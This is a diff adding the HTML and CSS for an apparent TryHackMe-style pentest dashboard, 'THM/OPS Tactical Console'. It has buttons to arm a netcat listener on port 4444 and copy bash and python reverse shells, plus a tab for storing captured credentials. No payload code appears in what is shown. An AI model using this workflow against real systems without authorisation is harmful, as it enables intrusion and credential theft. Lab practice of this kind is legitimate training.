@@ -1,0 +1,2149 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>THM/OPS — Tactical Console</title>
+<style>
+  /* ---------- ROOT / RESET ---------- */
+  *,*::before,*::after { box-sizing: border-box; margin:0; padding:0; }
+  html,body { height:100%; width:100%; overflow:hidden; }
+  body {
+    font-family: ui-monospace, "SF Mono", Menlo, Consolas, monospace;
+    font-size: 12px;
+    line-height: 1.4;
+    color: var(--fg);
+    background: var(--bg);
+    -webkit-font-smoothing: antialiased;
+    user-select: text;
+  }
+  button, input, select, textarea {
+    font: inherit;
+    color: inherit;
+    background: transparent;
+    border: 1px solid var(--line);
+    border-radius: 1px;
+    padding: 4px 8px;
+    outline: none;
+  }
+  button { cursor: pointer; }
+  button:hover { background: var(--hover); }
+  ::selection { background: var(--accent); color: var(--bg); }
+
+  /* ---------- THEMES ---------- */
+  body[data-theme="tactical"] {
+    --bg: #07090d;
+    --bg-2: #0c1116;
+    --bg-3: #11171e;
+    --fg: #b9c6cf;
+    --fg-dim: #6c7c87;
+    --accent: #5cb8d8;
+    --accent-2: #d4a857;
+    --good: #4ea877;
+    --bad:  #c25656;
+    --warn: #d4a857;
+    --info: #5cb8d8;
+    --line: #1b2530;
+    --line-2: #283341;
+    --hover: #131a23;
+    --glow: none;
+    --scan: transparent;
+  }
+  body[data-theme="neon"] {
+    --bg: #000;
+    --bg-2: #060010;
+    --bg-3: #08001a;
+    --fg: #c9f7ff;
+    --fg-dim: #5a7585;
+    --accent: #00e5ff;
+    --accent-2: #d946ef;
+    --good: #00ffa3;
+    --bad:  #ff3b6b;
+    --warn: #ffd166;
+    --info: #00e5ff;
+    --line: #163040;
+    --line-2: #1f4258;
+    --hover: #0a1622;
+    --glow: 0 0 6px currentColor;
+    --scan: rgba(0,229,255,0.04);
+  }
+  body[data-theme="neon"] {
+    background:
+      radial-gradient(ellipse at top, rgba(0,229,255,0.06), transparent 60%),
+      linear-gradient(rgba(0,229,255,0.03) 1px, transparent 1px) 0 0 / 100% 28px,
+      linear-gradient(90deg, rgba(0,229,255,0.03) 1px, transparent 1px) 0 0 / 28px 100%,
+      #000;
+  }
+  body[data-theme="neon"] .glow-text { text-shadow: var(--glow); }
+  body[data-theme="neon"]::after {
+    content: "";
+    position: fixed; inset:0;
+    background: repeating-linear-gradient(0deg, var(--scan) 0 2px, transparent 2px 4px);
+    pointer-events: none;
+    animation: scan 6s linear infinite;
+    z-index: 9999;
+  }
+  @keyframes scan { from { background-position:0 0 } to { background-position:0 100vh } }
+
+  /* ---------- TYPOGRAPHY ---------- */
+  .h-label {
+    text-transform: uppercase;
+    letter-spacing: 0.2em;
+    font-size: 10px;
+    color: var(--fg-dim);
+  }
+  .h-title {
+    text-transform: uppercase;
+    letter-spacing: 0.18em;
+    font-size: 11px;
+    color: var(--accent);
+  }
+  body[data-theme="neon"] .h-title { text-shadow: var(--glow); }
+
+  /* ---------- LAYOUT ROOTS ---------- */
+  #app {
+    display: grid;
+    grid-template-rows: 56px 32px 80px 1fr 28px;
+    height: 100vh;
+    width: 100vw;
+  }
+
+  /* ---------- TOPBAR ---------- */
+  #topbar {
+    display: flex;
+    align-items: center;
+    gap: 18px;
+    padding: 0 14px;
+    border-bottom: 1px solid var(--line);
+    background: var(--bg-2);
+  }
+  #brand {
+    display:flex; align-items:center; gap:8px;
+    font-weight:700;
+    letter-spacing:0.22em;
+    color: var(--accent);
+  }
+  body[data-theme="neon"] #brand { text-shadow: var(--glow); }
+  #brand .dot {
+    width:8px; height:8px;
+    background: var(--accent);
+    border-radius: 50%;
+    box-shadow: var(--glow);
+  }
+  .topcell {
+    display:flex; align-items:center; gap:6px;
+    padding: 4px 10px;
+    border: 1px solid var(--line);
+    border-radius: 1px;
+    background: var(--bg-3);
+    min-width: 70px;
+  }
+  .topcell .k { color: var(--fg-dim); font-size:10px; letter-spacing:0.18em; text-transform: uppercase; }
+  .topcell .v { color: var(--fg); font-weight:600; }
+  .topcell .v.accent { color: var(--accent); }
+  .topcell .v.amber { color: var(--accent-2); }
+  #spacer { flex: 1; }
+  #status-led {
+    display:flex; align-items:center; gap:8px;
+    padding: 4px 10px;
+    border: 1px solid var(--line);
+    background: var(--bg-3);
+  }
+  #status-led .led {
+    width: 8px; height:8px; border-radius:50%;
+    background: var(--fg-dim);
+  }
+  #status-led.live .led {
+    background: var(--good);
+    animation: pulse 1.4s ease-in-out infinite;
+    box-shadow: var(--glow);
+  }
+  @keyframes pulse {
+    0%,100% { opacity: 1; transform: scale(1); }
+    50% { opacity: 0.4; transform: scale(0.7); }
+  }
+  .btn-primary {
+    border-color: var(--accent);
+    color: var(--accent);
+    padding: 4px 12px;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    font-size: 11px;
+  }
+  .btn-primary:hover { background: var(--accent); color: var(--bg); }
+  .btn-ghost {
+    border-color: var(--line-2);
+    color: var(--fg-dim);
+    padding: 4px 10px;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    font-size: 11px;
+  }
+  .btn-ghost:hover { color: var(--fg); border-color: var(--fg); }
+
+  /* ---------- TABS ---------- */
+  #tabs {
+    display:flex;
+    border-bottom: 1px solid var(--line);
+    background: var(--bg-2);
+    padding: 0 12px;
+  }
+  .tab {
+    padding: 0 18px;
+    height: 100%;
+    display:flex; align-items:center; gap:8px;
+    color: var(--fg-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.18em;
+    font-size: 11px;
+    border-right: 1px solid var(--line);
+    cursor: pointer;
+    background: transparent;
+    border-top: none; border-bottom: none; border-left: none;
+    border-radius: 0;
+  }
+  .tab:first-child { border-left: 1px solid var(--line); }
+  .tab.active {
+    color: var(--accent);
+    background: var(--bg-3);
+    box-shadow: inset 0 2px 0 var(--accent);
+  }
+  body[data-theme="neon"] .tab.active { text-shadow: var(--glow); }
+  .tab .badge {
+    padding: 1px 6px;
+    border: 1px solid var(--line-2);
+    background: var(--bg);
+    color: var(--accent-2);
+    font-size: 10px;
+    letter-spacing: 0.1em;
+  }
+
+  /* ---------- PHASE STRIP ---------- */
+  #phase-strip {
+    display: grid;
+    grid-template-columns: repeat(6, 1fr);
+    gap: 6px;
+    padding: 8px 14px;
+    border-bottom: 1px solid var(--line);
+    background: var(--bg-2);
+    align-items: stretch;
+  }
+  .phase {
+    position: relative;
+    padding: 8px 10px;
+    border: 1px solid var(--line);
+    background: var(--bg-3);
+    display: flex; flex-direction: column; gap: 2px;
+    overflow: hidden;
+  }
+  .phase .idx {
+    font-size: 10px;
+    color: var(--fg-dim);
+    letter-spacing: 0.2em;
+  }
+  .phase .name {
+    font-size: 11px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.12em;
+    color: var(--fg);
+  }
+  .phase .sub {
+    font-size: 10px;
+    color: var(--fg-dim);
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+  .phase.done {
+    background: rgba(78,168,119,0.08);
+    border-color: var(--good);
+  }
+  .phase.done .idx::before { content: "✓ "; color: var(--good); }
+  .phase.done .name { color: var(--good); }
+  .phase.done .elapsed {
+    position:absolute; right:8px; top:6px;
+    font-size: 10px; color: var(--good);
+  }
+  .phase.active {
+    border-color: var(--accent);
+    background: rgba(92,184,216,0.06);
+  }
+  .phase.active .name { color: var(--accent); }
+  body[data-theme="neon"] .phase.active .name { text-shadow: var(--glow); }
+  .phase.active::after {
+    content: "";
+    position: absolute;
+    left: 0; bottom: 0;
+    height: 2px; width: 30%;
+    background: var(--accent);
+    animation: scanbar 1.6s ease-in-out infinite;
+    box-shadow: var(--glow);
+  }
+  @keyframes scanbar {
+    0% { left: -30%; }
+    100% { left: 100%; }
+  }
+  /* connectors */
+  #phase-strip .phase:not(:last-child)::before {
+    content: "▸";
+    position: absolute;
+    right: -10px; top: 50%;
+    transform: translate(0, -50%);
+    color: var(--line-2);
+    z-index: 2;
+    background: var(--bg-2);
+    padding: 0 2px;
+  }
+
+  /* ---------- MAIN GRID ---------- */
+  #main {
+    display: grid;
+    grid-template-rows: var(--row1, 62%) 6px 1fr;
+    background: var(--line);
+    overflow: hidden;
+    min-height: 0;
+  }
+  #main > #telemetry,
+  #main > #row2 { background: var(--bg); min-height: 0; }
+  #row-resizer {
+    background: var(--line);
+    cursor: row-resize;
+    position: relative;
+    border-top: 1px solid var(--line);
+    border-bottom: 1px solid var(--line);
+    transition: background 0.15s;
+  }
+  #row-resizer:hover, #row-resizer.dragging {
+    background: var(--accent);
+  }
+  #row-resizer::before {
+    content: "";
+    position: absolute;
+    left: 50%; top: 50%;
+    transform: translate(-50%, -50%);
+    width: 36px; height: 2px;
+    background: var(--line-2);
+    border-radius: 1px;
+  }
+  #row-resizer:hover::before, #row-resizer.dragging::before { background: var(--bg); }
+  body.row-resizing { cursor: row-resize; user-select: none; }
+  body.row-resizing iframe { pointer-events: none; }
+  #row2 {
+    display: grid;
+    grid-template-columns: 1fr 1fr 1fr;
+    gap: 1px;
+    background: var(--line);
+    min-height: 0;
+  }
+  #row2 > * { background: var(--bg); min-height: 0; }
+
+  .pane {
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+    min-height: 0;
+  }
+  .pane-head {
+    display: flex; align-items: center; gap: 10px;
+    padding: 8px 12px;
+    border-bottom: 1px solid var(--line);
+    background: var(--bg-2);
+    min-height: 32px;
+  }
+  .pane-head .h-title { flex: 0 0 auto; }
+  .pane-head .spacer { flex: 1; }
+  .pane-body {
+    flex: 1 1 0;
+    overflow-y: auto;
+    overflow-x: hidden;
+    padding: 8px 12px;
+    min-height: 0;
+  }
+  .pane-body::-webkit-scrollbar { width: 8px; }
+  .pane-body::-webkit-scrollbar-track { background: var(--bg-2); }
+  .pane-body::-webkit-scrollbar-thumb { background: var(--line-2); border-radius: 1px; }
+
+  /* ---------- TELEMETRY ---------- */
+  #telemetry .pane-body {
+    padding: 4px 12px;
+    font-size: 12px;
+  }
+  .log-line {
+    display: grid;
+    grid-template-columns: 78px 70px 1fr;
+    gap: 8px;
+    padding: 2px 0;
+    align-items: baseline;
+    border-bottom: 1px dotted transparent;
+    animation: slidein 0.25s ease-out;
+  }
+  @keyframes slidein {
+    from { opacity:0; transform: translateX(-12px); }
+    to   { opacity:1; transform: translateX(0); }
+  }
+  .log-line .ts { color: var(--fg-dim); font-size: 10px; }
+  .log-line .src {
+    text-align: center;
+    font-size: 10px;
+    padding: 1px 4px;
+    border: 1px solid var(--line-2);
+    color: var(--fg-dim);
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+  }
+  .src-ops    { color: var(--accent) !important; border-color: var(--accent) !important; }
+  .src-claude { color: var(--accent-2) !important; border-color: var(--accent-2) !important; }
+  .src-you    { color: var(--fg) !important; border-color: var(--fg) !important; }
+  .src-tool   { color: var(--info) !important; border-color: var(--info) !important; }
+  .src-result { color: var(--good) !important; border-color: var(--good) !important; }
+  .log-line .msg {
+    color: var(--fg);
+    white-space: pre-wrap;
+    word-break: break-word;
+    font-family: ui-monospace, monospace;
+  }
+  .log-line.good .msg { color: var(--good); }
+  .log-line.warn .msg { color: var(--warn); }
+  .log-line.bad  .msg { color: var(--bad); }
+  .log-line.dim  .msg { color: var(--fg-dim); }
+
+  /* ---------- CURRENT OP ---------- */
+  #op-name {
+    font-size: 22px;
+    letter-spacing: 0.08em;
+    color: var(--accent);
+    font-weight: 700;
+    text-transform: uppercase;
+  }
+  body[data-theme="neon"] #op-name { text-shadow: var(--glow); }
+  #op-tagline {
+    color: var(--fg-dim);
+    font-size: 11px;
+    margin-top: 4px;
+    font-style: italic;
+  }
+  .op-section {
+    margin-top: 14px;
+  }
+  .op-section .lab {
+    color: var(--accent-2);
+    letter-spacing: 0.2em;
+    font-size: 10px;
+    text-transform: uppercase;
+    margin-bottom: 4px;
+  }
+  .op-section p {
+    color: var(--fg);
+    font-size: 12px;
+    line-height: 1.5;
+  }
+  .op-section ul {
+    list-style: none;
+    padding: 0;
+  }
+  .op-section ul li {
+    padding: 3px 0 3px 14px;
+    position: relative;
+    color: var(--fg);
+    font-size: 12px;
+  }
+  .op-section ul li::before {
+    content: "›";
+    position: absolute;
+    left: 0;
+    color: var(--accent);
+  }
+
+  /* ---------- SERVICES ---------- */
+  .svc-card {
+    border: 1px solid var(--line);
+    background: var(--bg-2);
+    margin-bottom: 6px;
+    cursor: pointer;
+    transition: border-color 0.15s;
+  }
+  .svc-card:hover { border-color: var(--line-2); }
+  .svc-card.open { border-color: var(--accent); }
+  .svc-head {
+    display: grid;
+    grid-template-columns: 60px 1fr auto;
+    align-items: center;
+    gap: 8px;
+    padding: 8px 10px;
+  }
+  .svc-port {
+    font-weight: 700;
+    color: var(--good);
+    font-size: 13px;
+  }
+  .svc-name {
+    color: var(--fg);
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    font-size: 11px;
+  }
+  .svc-ver {
+    color: var(--fg-dim);
+    font-size: 10px;
+  }
+  .svc-caret { color: var(--fg-dim); font-size: 10px; }
+  .svc-body {
+    display: none;
+    border-top: 1px solid var(--line);
+    padding: 8px 10px;
+    background: var(--bg-3);
+  }
+  .svc-card.open .svc-body { display: block; }
+  .svc-body p { color: var(--fg-dim); font-size: 11px; margin-bottom: 8px; line-height: 1.4; }
+  .svc-vectors { display: flex; flex-direction: column; gap: 4px; }
+  .svc-vector {
+    display: grid;
+    grid-template-columns: 1fr auto;
+    align-items: center;
+    gap: 6px;
+    padding: 4px 6px;
+    border: 1px solid var(--line);
+    background: var(--bg);
+  }
+  .svc-vector code {
+    font-family: ui-monospace, monospace;
+    font-size: 11px;
+    color: var(--accent);
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+  .svc-vector .copy {
+    font-size: 9px;
+    padding: 2px 6px;
+    color: var(--fg-dim);
+    border-color: var(--line-2);
+  }
+  .svc-vector .copy:hover { color: var(--accent); border-color: var(--accent); }
+
+  /* ---------- DOSSIER ---------- */
+  .dossier-kv {
+    display: grid;
+    grid-template-columns: 90px 1fr;
+    gap: 4px 10px;
+    margin-bottom: 12px;
+    font-size: 11px;
+  }
+  .dossier-kv .k {
+    color: var(--fg-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.15em;
+    font-size: 10px;
+  }
+  .dossier-kv .v { color: var(--fg); word-break: break-all; }
+
+  .toolkit {
+    display: flex;
+    flex-direction: column;
+    gap: 4px;
+    margin-bottom: 12px;
+  }
+  .toolkit button {
+    text-align: left;
+    padding: 6px 10px;
+    border-color: var(--line-2);
+    color: var(--fg);
+    font-size: 11px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+  .toolkit button:hover {
+    border-color: var(--accent);
+    color: var(--accent);
+  }
+  .toolkit button .tag {
+    font-size: 9px;
+    color: var(--fg-dim);
+    letter-spacing: 0.15em;
+  }
+
+  .tip {
+    border: 1px dashed var(--line-2);
+    padding: 8px 10px;
+    color: var(--fg-dim);
+    font-size: 11px;
+    line-height: 1.5;
+  }
+  .tip b { color: var(--accent-2); font-weight: 600; }
+
+  /* ---------- FOOTER ---------- */
+  #footer {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 0 14px;
+    border-top: 1px solid var(--line);
+    background: var(--bg-2);
+    font-size: 10px;
+    color: var(--fg-dim);
+    letter-spacing: 0.1em;
+  }
+  #footer select {
+    background: var(--bg-3);
+    border-color: var(--line);
+    padding: 2px 6px;
+    font-size: 11px;
+    color: var(--fg);
+  }
+  #footer a {
+    color: var(--accent);
+    text-decoration: none;
+    margin-left: auto;
+  }
+  #footer a:hover { text-decoration: underline; }
+
+  /* ---------- CREDS VIEW ---------- */
+  #creds {
+    display: none;
+    grid-template-columns: 2fr 1fr;
+    gap: 1px;
+    background: var(--line);
+    overflow: hidden;
+    min-height: 0;
+    grid-row: 3 / 5;
+  }
+  #creds.show { display: grid; }
+  #creds > * { background: var(--bg); min-height: 0; }
+  .cred-card {
+    border: 1px solid var(--line);
+    background: var(--bg-2);
+    padding: 10px 12px;
+    margin-bottom: 8px;
+  }
+  .cred-card .cred-head {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 6px;
+  }
+  .cred-card .cred-svc {
+    color: var(--accent);
+    text-transform: uppercase;
+    letter-spacing: 0.15em;
+    font-size: 11px;
+  }
+  body[data-theme="neon"] .cred-card .cred-svc { text-shadow: var(--glow); }
+  .cred-card .cred-src {
+    color: var(--fg-dim);
+    font-size: 10px;
+  }
+  .cred-row {
+    display: grid;
+    grid-template-columns: 60px 1fr auto;
+    gap: 8px;
+    align-items: center;
+    padding: 3px 0;
+    font-size: 12px;
+  }
+  .cred-row .k {
+    color: var(--fg-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.15em;
+    font-size: 10px;
+  }
+  .cred-row .v {
+    color: var(--fg);
+    font-family: ui-monospace, monospace;
+    word-break: break-all;
+  }
+  .cred-row .v.mono { color: var(--good); }
+  .cred-actions {
+    display: flex;
+    gap: 4px;
+  }
+  .cred-actions button {
+    font-size: 10px;
+    padding: 2px 8px;
+    color: var(--fg-dim);
+    border-color: var(--line-2);
+  }
+  .cred-actions button:hover { color: var(--accent); border-color: var(--accent); }
+  .cred-actions button.del:hover { color: var(--bad); border-color: var(--bad); }
+  .cred-notes {
+    margin-top: 6px;
+    padding-top: 6px;
+    border-top: 1px dotted var(--line);
+    font-size: 11px;
+    color: var(--fg-dim);
+    font-style: italic;
+  }
+  #cred-form { display: flex; flex-direction: column; gap: 8px; }
+  #cred-form label {
+    display: flex; flex-direction: column;
+    gap: 3px;
+    font-size: 10px;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    color: var(--fg-dim);
+  }
+  #cred-form input, #cred-form textarea {
+    background: var(--bg-3);
+    border-color: var(--line);
+    color: var(--fg);
+    font-family: ui-monospace, monospace;
+    padding: 5px 8px;
+    font-size: 12px;
+    text-transform: none;
+    letter-spacing: normal;
+  }
+  #cred-form textarea { resize: vertical; min-height: 50px; }
+  #cred-form button {
+    padding: 8px 12px;
+    border-color: var(--accent);
+    color: var(--accent);
+    text-transform: uppercase;
+    letter-spacing: 0.15em;
+    font-size: 11px;
+  }
+  #cred-form button:hover { background: var(--accent); color: var(--bg); }
+
+  /* ---------- TOAST ---------- */
+  #toast-stack {
+    position: fixed;
+    right: 16px;
+    top: 70px;
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+    z-index: 10000;
+    pointer-events: none;
+  }
+  .toast {
+    background: var(--bg-2);
+    border: 1px solid var(--good);
+    color: var(--good);
+    padding: 8px 14px;
+    font-size: 11px;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    box-shadow: var(--glow);
+    animation: slidein 0.3s ease-out;
+    max-width: 360px;
+  }
+  .toast.warn { border-color: var(--warn); color: var(--warn); }
+  .toast.bad  { border-color: var(--bad);  color: var(--bad); }
+
+  /* hide stuff when in creds view */
+  body.view-creds #phase-strip,
+  body.view-creds #main { display: none; }
+  body.view-creds #creds { display: grid; }
+
+  /* ---------- ESCALATION OVERLAY ---------- */
+  #esc-overlay {
+    position: fixed; inset: 0;
+    z-index: 10001;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    background: radial-gradient(ellipse at center, rgba(0,0,0,0.55) 0%, rgba(0,0,0,0.85) 70%);
+    pointer-events: none;
+    overflow: hidden;
+  }
+  #esc-overlay.show { display: flex; animation: esc-fade 0.4s ease-out; }
+  #esc-overlay.root-stage { background: radial-gradient(ellipse at center, rgba(60,0,0,0.6) 0%, rgba(0,0,0,0.9) 70%); }
+  @keyframes esc-fade { from { opacity: 0; } to { opacity: 1; } }
+
+  #esc-grid {
+    position: absolute; inset: 0;
+    background:
+      linear-gradient(var(--accent) 1px, transparent 1px) 0 0 / 100% 40px,
+      linear-gradient(90deg, var(--accent) 1px, transparent 1px) 0 0 / 40px 100%;
+    opacity: 0.08;
+    animation: esc-grid-pan 4s linear infinite;
+  }
+  @keyframes esc-grid-pan {
+    from { background-position: 0 0, 0 0; }
+    to   { background-position: 0 40px, 40px 0; }
+  }
+  #esc-overlay.root-stage #esc-grid {
+    background:
+      linear-gradient(var(--bad) 1px, transparent 1px) 0 0 / 100% 40px,
+      linear-gradient(90deg, var(--bad) 1px, transparent 1px) 0 0 / 40px 100%;
+    opacity: 0.14;
+  }
+
+  #esc-rings {
+    position: absolute;
+    width: 1px; height: 1px;
+    left: 50%; top: 50%;
+  }
+  #esc-rings span {
+    position: absolute;
+    left: 50%; top: 50%;
+    width: 60px; height: 60px;
+    border: 2px solid var(--accent);
+    border-radius: 50%;
+    transform: translate(-50%, -50%);
+    opacity: 0;
+    animation: esc-ring 2.2s ease-out infinite;
+    box-shadow: 0 0 20px var(--accent);
+  }
+  #esc-rings span:nth-child(2) { animation-delay: 0.5s; }
+  #esc-rings span:nth-child(3) { animation-delay: 1.0s; }
+  #esc-overlay.root-stage #esc-rings span { border-color: var(--bad); box-shadow: 0 0 30px var(--bad); }
+  @keyframes esc-ring {
+    0%   { width: 60px;  height: 60px;  opacity: 0.9; }
+    100% { width: 1200px; height: 1200px; opacity: 0; }
+  }
+
+  #esc-card {
+    position: relative;
+    background: var(--bg);
+    border: 1px solid var(--accent);
+    padding: 28px 48px;
+    text-align: center;
+    box-shadow: 0 0 40px var(--accent), inset 0 0 20px rgba(92,184,216,0.1);
+    min-width: 460px;
+  }
+  #esc-overlay.root-stage #esc-card {
+    border-color: var(--bad);
+    box-shadow: 0 0 60px var(--bad), inset 0 0 30px rgba(194,86,86,0.15);
+    animation: esc-card-shake 0.5s ease-in-out;
+  }
+  @keyframes esc-card-shake {
+    0%,100% { transform: translateX(0); }
+    20% { transform: translateX(-6px); }
+    40% { transform: translateX(6px); }
+    60% { transform: translateX(-3px); }
+    80% { transform: translateX(3px); }
+  }
+  #esc-stage-label {
+    font-size: 11px;
+    letter-spacing: 0.4em;
+    color: var(--accent);
+    text-transform: uppercase;
+    margin-bottom: 6px;
+    text-shadow: 0 0 8px var(--accent);
+  }
+  #esc-overlay.root-stage #esc-stage-label {
+    color: var(--bad);
+    text-shadow: 0 0 8px var(--bad);
+  }
+  #esc-stage-name {
+    font-size: 56px;
+    font-weight: 700;
+    letter-spacing: 0.15em;
+    color: var(--fg);
+    margin-bottom: 24px;
+    font-family: ui-monospace, monospace;
+    text-shadow: 0 0 24px var(--accent);
+    animation: esc-name-glow 1.4s ease-in-out infinite;
+  }
+  #esc-overlay.root-stage #esc-stage-name {
+    text-shadow: 0 0 24px var(--bad), 0 0 60px var(--bad);
+    color: #ffd0d0;
+  }
+  @keyframes esc-name-glow {
+    0%,100% { text-shadow: 0 0 16px var(--accent); }
+    50%     { text-shadow: 0 0 36px var(--accent), 0 0 64px var(--accent); }
+  }
+
+  #esc-progress {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 4px;
+    margin-bottom: 18px;
+  }
+  .esc-pip {
+    flex: 0 0 auto;
+    padding: 5px 10px;
+    border: 1px solid var(--line-2);
+    background: var(--bg-3);
+    color: var(--fg-dim);
+    font-size: 9px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    position: relative;
+    transition: all 0.4s;
+  }
+  .esc-pip::after {
+    content: "▸";
+    position: absolute;
+    right: -10px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: var(--line-2);
+    font-size: 11px;
+  }
+  .esc-pip:last-child::after { display: none; }
+  .esc-pip.done {
+    background: rgba(78,168,119,0.15);
+    border-color: var(--good);
+    color: var(--good);
+  }
+  .esc-pip.done::before { content: "✓ "; }
+  .esc-pip.active {
+    background: var(--accent);
+    color: var(--bg);
+    border-color: var(--accent);
+    box-shadow: 0 0 20px var(--accent);
+    animation: esc-pip-pulse 1s ease-in-out infinite;
+  }
+  #esc-overlay.root-stage .esc-pip.active {
+    background: var(--bad);
+    border-color: var(--bad);
+    box-shadow: 0 0 30px var(--bad);
+    color: #fff;
+  }
+  @keyframes esc-pip-pulse {
+    0%,100% { transform: scale(1); }
+    50%     { transform: scale(1.08); }
+  }
+
+  #esc-banner {
+    color: var(--fg-dim);
+    font-size: 11px;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    border-top: 1px dashed var(--line-2);
+    padding-top: 10px;
+    margin-top: 4px;
+  }
+  #esc-overlay.root-stage #esc-banner { color: var(--bad); }
+
+  /* ---------- HEARTBEAT ECG ---------- */
+  #heartbeat {
+    position: fixed;
+    right: 18px;
+    top: 14px;
+    width: 140px;
+    height: 28px;
+    border: 1px solid var(--line);
+    background: var(--bg-3);
+    z-index: 10;
+    pointer-events: none;
+    opacity: 0.85;
+  }
+  #hb-canvas { display: block; width: 100%; height: 100%; }
+
+  /* utility */
+  .hide { display: none !important; }
+  code.k {
+    font-family: ui-monospace, monospace;
+    color: var(--accent);
+    background: var(--bg-3);
+    padding: 1px 4px;
+    border: 1px solid var(--line);
+  }
+</style>
+</head>
+<body data-theme="tactical">
+
+<div id="app">
+
+  <!-- ============== TOPBAR ============== -->
+  <div id="topbar">
+    <div id="brand"><span class="dot"></span><span class="glow-text">THM/OPS</span></div>
+
+    <div class="topcell"><span class="k">Target</span><span class="v accent" id="tb-target">—</span></div>
+    <div class="topcell"><span class="k">Elapsed</span><span class="v" id="tb-elapsed">00:00:00</span></div>
+    <div class="topcell"><span class="k">Open</span><span class="v amber" id="tb-openports">0</span></div>
+    <div class="topcell"><span class="k">Phase</span><span class="v" id="tb-phase">IDLE</span></div>
+
+    <div id="spacer"></div>
+
+    <div id="status-led"><span class="led"></span><span class="h-label" id="status-text">STANDBY</span></div>
+    <button class="btn-primary" id="btn-listener">⚡ Arm Listener :4444</button>
+    <button class="btn-ghost" id="btn-theme">◐ Theme</button>
+  </div>
+
+  <!-- ============== TABS ============== -->
+  <div id="tabs">
+    <button class="tab active" data-view="ops">Operations</button>
+    <button class="tab" data-view="creds">Credentials <span class="badge" id="cred-badge">0</span></button>
+  </div>
+
+  <!-- ============== PHASE STRIP ============== -->
+  <div id="phase-strip"></div>
+
+  <!-- ============== MAIN GRID ============== -->
+  <div id="main">
+
+    <div id="telemetry" class="pane">
+      <div class="pane-head">
+        <span class="h-title glow-text">▌ Telemetry Stream</span>
+        <span class="spacer"></span>
+        <span class="h-label" id="tel-count">0 lines</span>
+        <button class="btn-ghost" id="btn-clear-tel">Clear</button>
+      </div>
+      <div class="pane-body" id="tel-body"></div>
+    </div>
+
+    <div id="row-resizer" title="Drag to resize"></div>
+
+    <div id="row2">
+
+      <div id="op" class="pane">
+        <div class="pane-head"><span class="h-title glow-text">▌ Current Operation</span></div>
+        <div class="pane-body" id="op-body">
+          <div id="op-name">STANDBY</div>
+          <div id="op-tagline">Awaiting tool signature on telemetry stream.</div>
+
+          <div class="op-section">
+            <div class="lab">Doing Now</div>
+            <p id="op-doing">Nothing yet — start a tool and the HUD will identify it automatically.</p>
+          </div>
+
+          <div class="op-section">
+            <div class="lab">Why This Matters</div>
+            <p id="op-why">Every step has a purpose. When a tool runs, this panel explains what the operator is trying to learn and why it moves the engagement forward.</p>
+          </div>
+
+          <div class="op-section">
+            <div class="lab">Watch For</div>
+            <ul id="op-watch">
+              <li>The HUD will populate this list as the tool runs.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <div id="svcs" class="pane">
+        <div class="pane-head">
+          <span class="h-title glow-text">▌ Discovered Services</span>
+          <span class="spacer"></span>
+          <span class="h-label" id="svc-count">0</span>
+        </div>
+        <div class="pane-body" id="svc-body">
+          <div class="h-label" style="color:var(--fg-dim); padding: 12px 0;">No open ports observed yet. Run a port scan against the target.</div>
+        </div>
+      </div>
+
+      <div id="dossier" class="pane">
+        <div class="pane-head"><span class="h-title glow-text">▌ Dossier</span></div>
+        <div class="pane-body">
+          <div class="dossier-kv">
+            <div class="k">Source</div><div class="v" id="d-source">—</div>
+            <div class="k">Started</div><div class="v" id="d-started">—</div>
+            <div class="k">Command</div><div class="v" id="d-cmd">—</div>
+          </div>
+
+          <div class="h-label" style="margin-bottom:6px;">Toolkit</div>
+          <div class="toolkit">
+            <button data-tk="listener">Arm netcat listener<span class="tag">:4444</span></button>
+            <button data-tk="bash">Copy bash reverse shell<span class="tag">BASH</span></button>
+            <button data-tk="python">Copy python PTY revshell<span class="tag">PY</span></button>
+            <button data-tk="stab">Copy TTY stabilizer<span class="tag">STTY</span></button>
+          </div>
+
+          <div class="tip">
+            <b>Tip.</b> Click any open port card to see attack vectors with the target IP and port number already substituted. Hit copy and paste straight into your shell.
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ============== CREDS VIEW ============== -->
+  <div id="creds">
+    <div class="pane">
+      <div class="pane-head">
+        <span class="h-title glow-text">▌ Captured Credentials</span>
+        <span class="spacer"></span>
+        <span class="h-label" id="cred-count2">0</span>
+      </div>
+      <div class="pane-body" id="cred-list">
+        <div class="h-label" style="color:var(--fg-dim);">No credentials captured yet.</div>
+      </div>
+    </div>
+    <div class="pane">
+      <div class="pane-head"><span class="h-title glow-text">▌ Add Credential</span></div>
+      <div class="pane-body">
+        <form id="cred-form">
+          <label>Service<input name="service" placeholder="ssh / ftp / smb / http"></label>
+          <label>Username<input name="username" placeholder="admin"></label>
+          <label>Password<input name="password" placeholder="hunter2"></label>
+          <label>Source<input name="source" placeholder="hydra / manual / loot"></label>
+          <label>Notes<textarea name="notes" placeholder="optional"></textarea></label>
+          <button type="submit">+ Store Credential</button>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============== FOOTER ============== -->
+  <div id="footer">
+    <span class="h-label">SRC</span>
+    <select id="log-source"><option value="">auto-detect</option></select>
+    <span id="freshness">last update —</span>
+    <a href="/">← back to mission control</a>
+  </div>
+
+</div>
+
+<div id="toast-stack"></div>
+
